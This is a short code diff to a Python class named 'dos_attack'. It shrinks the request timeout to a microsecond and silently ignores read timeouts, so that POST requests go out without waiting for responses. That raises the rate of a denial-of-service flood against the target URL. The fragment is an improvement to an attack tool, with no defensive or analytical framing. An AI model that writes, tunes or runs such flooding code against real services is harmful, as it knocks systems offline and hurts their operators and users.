@@ -10,8 +10,10 @@ class dos_attack:
 
     def send_request(self):                         # Sends single request
         try:
-            response = requests.post(self.url, json=self.payload, timeout=5)
+            response = requests.post(self.url, json=self.payload, timeout=0.000001)
             return response.status_code
+        except requests.exceptions.ReadTimeout:
+            pass
         except Exception as e:
             return f"Error: {e}"
 
